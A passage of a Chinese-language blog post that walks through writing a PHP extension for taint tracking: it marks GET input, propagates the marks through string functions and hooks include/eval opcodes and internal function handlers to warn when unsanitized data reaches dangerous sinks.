num_index;</span><br><span class="line"><span class="keyword">char</span> *str_index;</span><br><span class="line">zval **data;</span><br><span class="line">HashTable *ht;</span><br><span class="line">zval *arr;</span><br><span class="line">  <span class="keyword">char</span> *data;</span><br><span class="line"><span class="keyword">char</span> *key;</span><br><span class="line">arr = PG(http_globals)[TRACK_VARS_GET];</span><br><span class="line">ht = HASH_OF(arr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (zend_hash_internal_pointer_reset(ht);</span><br><span class="line">zend_hash_has_more_elements(ht) == SUCCESS;</span><br><span class="line">zend_hash_move_forward(ht))</span><br><span class="line">&#123;</span><br><span class="line">zend_hash_get_current_key(ht, &amp;str_index, &amp;num_index, <span class="number">0</span>);</span><br><span class="line">zend_hash_get_current_data(ht, (<span class="keyword">void</span>**)&amp;data);</span><br><span class="line">key = Z_STRVAL_PP(data);</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">return</span> ZEND_USER_OPCODE_DISPATCH; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这几个函数的作用其实命名已经很明确了,但是还是想看一下,拿<code>zend_hash_get_current_key</code>来说</p><p>我们打个断点<code>break zend_hash_get_current_key_ex</code></p><p>我们来看一下</p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/228577/1557153113144-0d7921e9-8a8e-4502-8963-54c2fc9892ed.png#align=left&display=inline&height=1106&originHeight=1106&originWidth=2874&size=0&status=done&width=2874" alt></p><p>正如上面所说,跟命名是一样的,<code>str_index</code>将返回我们想要得到的key</p><p>将其打印出来</p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/228577/1557153113153-fc179079-04a0-4db5-825f-865cf07ff90a.png#align=left&display=inline&height=336&originHeight=336&originWidth=920&size=0&status=done&width=920" alt></p><h5 id="打标记"><a href="#打标记" class="headerlink" title="打标记"></a>打标记</h5><p>我们重新创建一个扩展,完成基本定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PHP_TAINT_MAGIC_LENGTH   sizeof(unsigned)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PHP_TAINT_MAGIC_NONE     0x00000000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PHP_TAINT_MAGIC_POSSIBLE 0x6A8FCE84</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PHP_TAINT_MAGIC_UNTAINT  0x2C5E7F2D</span></span><br><span class="line">PHP_FUNCTION(confirm_foobar_compiled);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ZEND_OPCODE_HANDLER_ARGS zend_execute_data *execute_data</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PHP_TAINT_MARK(zv, mark) *((unsigned *)(Z_STRVAL_P(zv) + Z_STRLEN_P(zv) + 1)) = (mark)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PHP_TAINT_POSSIBLE(zv) (*(unsigned *)(Z_STRVAL_P(zv) + Z_STRLEN_P(zv) + 1) == PHP_TAINT_MAGIC_POSSIBLE)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PHP_TAINT_UNTAINT(zv)  (*(unsigned *)(Z_STRVAL_P(zv) + Z_STRLEN_P(zv) + 1) == PHP_TAINT_MAGIC_UNTAINT)</span></span><br></pre></td></tr></table></figure><p>我们在请求初始化时,也就是<code>PHP_RINIT_FUNCTION</code>里面进行调用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PHP_RINIT_FUNCTION(ptaint)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(PG(http_globals)[TRACK_VARS_GET] &amp;&amp; zend_hash_num_elements(Z_ARRVAL_P(PG(http_globals)[TRACK_VARS_GET]))) &#123;</span><br><span class="line">php_taint_mark_arr(PG(http_globals)[TRACK_VARS_GET] TSRMLS_CC);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后递归对数组进行标记</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">php_taint_mark_arr</span><span class="params">(zval *symbol_table TSRMLS_DC)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">zval **data;</span><br><span class="line">HashTable *ht = Z_ARRVAL_P(symbol_table);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (zend_hash_internal_pointer_reset(ht);</span><br><span class="line">zend_hash_has_more_elements(ht) == SUCCESS;</span><br><span class="line">zend_hash_move_forward(ht))</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(zend_hash_get_current_data(ht, (<span class="keyword">void</span>**)&amp;data) == FAILURE)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(Z_TYPE_PP(data) == IS_ARRAY)</span><br><span class="line">&#123;</span><br><span class="line">php_taint_mark_arr(*data TSRMLS_CC);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(Z_TYPE_PP(data) == IS_STRING)&#123;</span><br><span class="line">Z_STRVAL_PP(data) = erealloc(Z_STRVAL_PP(data), Z_STRLEN_PP(data) + <span class="number">1</span> + PHP_TAINT_MAGIC_LENGTH);</span><br><span class="line">PHP_TAINT_MARK(*data, PHP_TAINT_MAGIC_POSSIBLE);</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看下效果</p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/228577/1557153113228-9d05e619-54a4-4d9d-ac9e-252dedd9c44b.png#align=left&display=inline&height=1618&originHeight=1618&originWidth=2548&size=0&status=done&width=2548" alt></p><p>参考：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://www.laruence.com/2009/04/28/719.html</span><br><span class="line">https://www.jianshu.com/p/c6dea66c54f3</span><br><span class="line">https://www.cnblogs.com/iamstudy/articles/php_code_rasp_2.html</span><br></pre></td></tr></table></figure><p>上篇写的污点标记,这篇我会分析一下污点传播以及检测攻击点。</p><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>这里我暂且认为只要经过类似<code>mysql_real_escape_string</code>、<code>addslashes</code>、<code>htmlentities</code>这类函数,我们都将标记清除,但是如果经过类似<code>base64_decode</code>、<code>strtolower</code>或者字符串拼接这类经过传递仍然可能存在危害的函数,我们要进行标记传递。</p><p>这里有个问题,就是如果开始的时候进行了全局转义,就一定没有了危险嘛,如果某次请求又经过了类似 <code>stripslashes</code>这样的函数使引号逃逸出来呢,这里我觉得可以不进行污点清除,将其置为中间态,经过<code>stripslashes</code>的时候再恢复污点状态,这样可以减少一部分漏报。</p><p>然后思路是在一开始所有的请求变量都打上标记,在一些危险函数,如<code>eval</code>、<code>include</code>、<code>file_put_contents</code>、<code>unlink</code>这类函数时进行检测标记,如果仍然存在标记,我们认为它存在攻击点,因此做出警告。</p><h4 id="污点传播"><a href="#污点传播" class="headerlink" title="污点传播"></a>污点传播</h4><p>这里需要了解的知识点</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//操作数类型</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_CONST    (1&lt;&lt;0)  <span class="comment">//1:字面量，编译时就可确定且不会改变的值，比如:$a = "hello~"，其中字符串"hello~"就是常量</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_TMP_VAR  (1&lt;&lt;1)  <span class="comment">//2:临时变量，比如：$a = "hello~" . time()，其中"hello~" . time()的值类型就是IS_TMP_VAR</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_VAR      (1&lt;&lt;2)  <span class="comment">//4:PHP变量是没有显式的在PHP脚本中定义的，不是直接在代码通过$var_name定义的。这个类型最常见的例子是PHP函数的返回值</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_UNUSED   (1&lt;&lt;3)  <span class="comment">//8:表示操作数没有用</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_CV       (1&lt;&lt;4)  <span class="comment">//16:PHP脚本变量，即脚本里通过$var_name定义的变量，这些变量是编译阶段确定的</span></span></span><br></pre></td></tr></table></figure><p>以及opline里获取到参数，大致思路是，根据HOOK的OP指令的不同，获取op1或者op2，然后根据op1_type或者op2_type分情况抽取参数值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">（1）    IS_TMP_VAR</span><br><span class="line">如果op的类型为临时变量，则调用get_zval_ptr_tmp获取参数值。</span><br><span class="line">（2）    IS_VAR</span><br><span class="line">如果是变量类型，则直接从opline-&gt;var.ptr里获取</span><br><span class="line">（3）    IS_CV</span><br><span class="line">如果是编译变量参考ZEND_ECHO_SPEC_CV_HANDLER中的处理方式，是直接从EG(active_symbol_table)中寻找。</span><br><span class="line">（4）IS_CONST</span><br><span class="line">如果op类型是常量，则直接获取opline-&gt;op1.zv即可。</span><br><span class="line">上述方法都是从PHP源码中选取的，比如一个ZEND_ECHO指令的Handler会有多个，分别处理不同类型的op，这里有：</span><br><span class="line">ZEND_ECHO_SPEC_VAR_HANDLER</span><br><span class="line">ZEND_ECHO_SPEC_TMP_HANDLER</span><br><span class="line">ZEND_ECHO_SPEC_CV_HANDLER</span><br><span class="line">ZEND_ECHO_SPEC_CONST_HANDLER</span><br></pre></td></tr></table></figure><p>但是这里也有说的不对的地方,可能是版本的原因,比如说<code>opline-&gt;var.ptr</code>,我们直接这样是获取不到的,但是我们可以参考tmp的实现方式。</p><p>具体请看<code>zend_execute.c</code></p><p>我们来看下<code>get_zval_ptr_tmp</code>是如何实现的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> zend_always_inline zval *_get_zval_ptr_tmp(zend_uint var, <span class="keyword">const</span> zend_execute_data *execute_data, zend_free_op *should_free TSRMLS_DC)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> should_free-&gt;var = &amp;EX_T(var).tmp_var;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是这个接口我们并不能直接调用,所以必须重新实现一下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTAINT_T(offset) (*EX_TMP_VAR(execute_data, offset))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> zval *<span class="title">ptaint_get_zval_ptr_tmp</span><span class="params">(zend_uint var, <span class="keyword">const</span> zend_execute_data *execute_data, zend_free_op *should_free TSRMLS_DC)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> should_free-&gt;var = &amp;PTAINT_T(var).tmp_var;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">hook_include_or_eval</span><span class="params">(ZEND_OPCODE_HANDLER_ARGS)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">zend_op *opline = execute_data-&gt;opline;</span><br><span class="line">zval *op1 = <span class="literal">NULL</span>;</span><br><span class="line">zend_free_op free_op1;</span><br><span class="line"><span class="keyword">switch</span> (PTAINT_OP1_TYPE(opline))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> IS_TMP_VAR:</span><br><span class="line">op1 = ptaint_get_zval_ptr_tmp(opline-&gt;op1.var, execute_data, &amp;free_op1 TSRMLS_CC);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ZEND_USER_OPCODE_DISPATCH; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看一下效果</p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/228577/1557153153499-aecf8b20-d1e9-4f3d-81f0-542d50a57813.png#align=left&display=inline&height=778&originHeight=778&originWidth=2868&size=0&status=done&width=2868" alt></p><p>可以看到这样实现是可以的,那么我们完善代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> zval *<span class="title">ptaint_get_zval_ptr_tmp</span><span class="params">(zend_uint var, <span class="keyword">const</span> zend_execute_data *execute_data, zend_free_op *should_free TSRMLS_DC)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> should_free-&gt;var = &amp;PTAINT_T(var).tmp_var;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> zval *<span class="title">ptaint_get_zval_ptr_var</span><span class="params">(zend_uint var, <span class="keyword">const</span> zend_execute_data *execute_data, zend_free_op *should_free TSRMLS_DC)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">zval *ptr = PTAINT_T(var).var.ptr;</span><br><span class="line"><span class="keyword">return</span> should_free-&gt;var = ptr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> zval **<span class="title">ptaint_get_zval_cv_lookup</span><span class="params">(zval ***ptr, zend_uint var, <span class="keyword">int</span> type TSRMLS_DC)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">zend_compiled_variable *cv = &amp;CV_DEF_OF(var);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!EG(active_symbol_table) ||</span><br><span class="line">    zend_hash_quick_find(EG(active_symbol_table), cv-&gt;name, cv-&gt;name_len+<span class="number">1</span>, cv-&gt;hash_value, (<span class="keyword">void</span> **)ptr)==FAILURE) &#123;</span><br><span class="line"><span class="keyword">switch</span> (type) &#123;</span><br><span class="line"><span class="keyword">case</span> BP_VAR_R:</span><br><span class="line"><span class="keyword">case</span> BP_VAR_UNSET:</span><br><span class="line">zend_error(E_NOTICE, <span class="string">"Undefined variable: %s"</span>, cv-&gt;name);</span><br><span class="line"><span class="comment">/* break missing intentionally */</span></span><br><span class="line"><span class="keyword">case</span> BP_VAR_IS:</span><br><span class="line"><span class="keyword">return</span> &amp;EG(uninitialized_zval_ptr);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> BP_VAR_RW:</span><br><span class="line">zend_error(E_NOTICE, <span class="string">"Undefined variable: %s"</span>, cv-&gt;name);</span><br><span class="line"><span class="comment">/* break missing intentionally */</span></span><br><span class="line"><span class="keyword">case</span> BP_VAR_W:</span><br><span class="line">Z_ADDREF(EG(uninitialized_zval));</span><br><span class="line"><span class="keyword">if</span> (!EG(active_symbol_table)) &#123;</span><br><span class="line">*ptr = (zval**)EX_CV_NUM(EG(current_execute_data), EG(active_op_array)-&gt;last_var + var);</span><br><span class="line">**ptr = &amp;EG(uninitialized_zval);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">zend_hash_quick_update(EG(active_symbol_table), cv-&gt;name, cv-&gt;name_len+<span class="number">1</span>, cv-&gt;hash_value, &amp;EG(uninitialized_zval_ptr), <span class="keyword">sizeof</span>(zval *), (<span class="keyword">void</span> **)ptr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> *ptr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> zval *<span class="title">ptaint_get_zval_ptr_cv</span><span class="params">(zend_uint var, <span class="keyword">int</span> type TSRMLS_DC)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">zval ***ptr = EX_CV_NUM(EG(current_execute_data), var);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (UNEXPECTED(*ptr == <span class="literal">NULL</span>)) &#123;</span><br><span class="line"><span class="keyword">return</span> *ptaint_get_zval_cv_lookup(ptr, var, type TSRMLS_CC);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> **ptr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">hook_include_or_eval</span><span class="params">(ZEND_OPCODE_HANDLER_ARGS)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">zend_op *opline = execute_data-&gt;opline;</span><br><span class="line">zval *op1 = <span class="literal">NULL</span>;</span><br><span class="line">zend_free_op free_op1;</span><br><span class="line"><span class="keyword">switch</span> (PTAINT_OP1_TYPE(opline))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> IS_TMP_VAR:</span><br><span class="line">op1 = ptaint_get_zval_ptr_tmp(PTAINT_OP1_GET_VAR(opline), execute_data, &amp;free_op1 TSRMLS_CC);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> IS_VAR:</span><br><span class="line">op1 = ptaint_get_zval_ptr_var(PTAINT_OP1_GET_VAR(opline), execute_data, &amp;free_op1 TSRMLS_CC);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> IS_CONST:</span><br><span class="line">op1 = PTAINT_OP1_GET_ZV(opline);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> IS_CV:</span><br><span class="line">op1 = ptaint_get_zval_ptr_cv(PTAINT_OP1_GET_VAR(opline), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(op1 &amp;&amp; Z_TYPE_P(op1) == IS_STRING &amp;&amp; PHP_TAINT_POSSIBLE(op1))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (opline-&gt;extended_value == ZEND_EVAL)</span><br><span class="line">&#123;</span><br><span class="line">zend_error(E_WARNING, <span class="string">"(eval): Variables are not safely processed into the function"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">zend_error(E_WARNING, <span class="string">"(include or require): Variables are not safely processed into the function"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ZEND_USER_OPCODE_DISPATCH; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至此,hook opcode来检测标记已经完成,但是有一部分函数需要来重新实现检测操作,下面来做解释,首先看一下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">zend_internal_function</span> &#123;</span></span><br><span class="line"><span class="comment">/* Common elements */</span></span><br><span class="line">zend_uchar type;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> * function_name;</span><br><span class="line">zend_class_entry *scope;</span><br><span class="line">zend_uint fn_flags;</span><br><span class="line"><span class="keyword">union</span> _zend_function *prototype;</span><br><span class="line">zend_uint num_args;</span><br><span class="line">zend_uint required_num_args;</span><br><span class="line">zend_arg_info *arg_info;</span><br><span class="line"><span class="comment">/* END of common elements */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> (*handler)(INTERNAL_FUNCTION_PARAMETERS);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_module_entry</span> *<span class="title">module</span>;</span></span><br><span class="line">&#125; zend_internal_function;</span><br></pre></td></tr></table></figure><p>Hook内部函数其实和hook opcode的思路大体一致,通过修改handler的指向,指向我们实现的函数,在完成相应操作后继续调用原来的函数实现hook。</p><p>这里参考taint的实现,修改handler</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ptaint_override_func</span><span class="params">(<span class="keyword">char</span> *name, uint len, php_func handler, php_func *stash TSRMLS_DC)</span> <span class="comment">/* &#123;&#123;&#123; */</span> </span>&#123;</span><br><span class="line">zend_function *func;</span><br><span class="line"><span class="keyword">if</span> (zend_hash_find(CG(function_table), name, len, (<span class="keyword">void</span> **)&amp;func) == SUCCESS) &#123;</span><br><span class="line"><span class="keyword">if</span> (stash) &#123;</span><br><span class="line">*stash = func-&gt;internal_function.handler;</span><br><span class="line">&#125;</span><br><span class="line">func-&gt;internal_function.handler = handler;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看下效果,handler的地址成功被修改</p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/228577/1557153153501-33729b38-9c49-40e5-ae75-387b33f63ccd.png#align=left&display=inline&height=492&originHeight=492&originWidth=2872&size=0&status=done&width=2872" alt></p><p>但是如此的话是有问题的,在进行修改handler的时候需要考虑会不会覆盖掉原来的,因此这里定义了一个新的结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">ptaint_overridden_fucs</span> /* &#123;</span>&#123;&#123; */ &#123;</span><br><span class="line">php_func strval;</span><br><span class="line">php_func <span class="built_in">sprintf</span>;</span><br><span class="line">php_func <span class="built_in">vsprintf</span>;</span><br><span class="line">php_func explode;</span><br><span class="line">php_func implode;</span><br><span class="line">php_func trim;</span><br><span class="line">php_func rtrim;</span><br><span class="line">php_func ltrim;</span><br><span class="line">php_func <span class="built_in">strstr</span>;</span><br><span class="line">php_func str_pad;</span><br><span class="line">php_func str_replace;</span><br><span class="line">php_func substr;</span><br><span class="line">php_func strtolower;</span><br><span class="line">php_func strtoupper;</span><br><span class="line">&#125; ptaint_origin_funcs;</span><br></pre></td></tr></table></figure><p>在修改handler处</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (stash) &#123;</span><br><span class="line">*stash = func-&gt;internal_function.handler;</span><br><span class="line">&#125;</span><br><span class="line">func-&gt;internal_function.handler = handler;</span><br></pre></td></tr></table></figure><p>这里存储原函数的地址</p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/228577/1557153153505-acb4804b-d875-48c7-a5f5-c94abced3394.png#align=left&display=inline&height=790&originHeight=790&originWidth=2546&size=0&status=done&width=2546" alt></p><p>然后将原来的handler修改为新函数,然后在新函数中利用上面的指针可以重新调用原来的处理函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">PHP_FUNCTION(ptaint_strtoupper)</span><br><span class="line">&#123;</span><br><span class="line">zval *str;</span><br><span class="line">int tainted = 0;</span><br><span class="line">php_func strtoupper;</span><br><span class="line">if (zend_parse_parameters(ZEND_NUM_ARGS() TSRMLS_CC, &quot;z&quot;, &amp;str) == FAILURE) &#123;</span><br><span class="line">return;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (IS_STRING == Z_TYPE_P(str) &amp;&amp; PHP_TAINT_POSSIBLE(str)) &#123;</span><br><span class="line">tainted = 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PTAINT_O_FUNC(strtoupper)(INTERNAL_FUNCTION_PARAM_PASSTHRU);</span><br><span class="line"></span><br><span class="line">if (tainted &amp;&amp; IS_STRING == Z_TYPE_P(return_value) &amp;&amp; Z_STRLEN_P(return_value)) &#123;</span><br><span class="line">Z_STRVAL_P(return_value) = erealloc(Z_STRVAL_P(return_value), Z_STRLEN_P(return_value) + 1 + PHP_TAINT_MAGIC_LENGTH);</span><br><span class="line">PHP_TAINT_MARK(return_value, PHP_TAINT_MAGIC_POSSIBLE);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在这重新调用原来函数执行,如果原来的字符串有标记的话将返回值也打上标记进行标记传递。</p><p>同样的原理,如果多个参数的情况,可以根据情况进行污点的检测,当然,如果想要做的更细的话,那就需要华更多的心思了。</p><p>文章到这里就结束了,感谢鸟哥的taint给了学习的机会,在后面一段时间我会去做完我想做的项目,如果有必要,我会把后续的记录整理后发出来,感谢。</p><p>参考：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://segmentfault.com/a/1190000014234234</span><br><span class="line">http://www.voidcn.com/article/p-gdecovzj-bpp.html</span><br><span 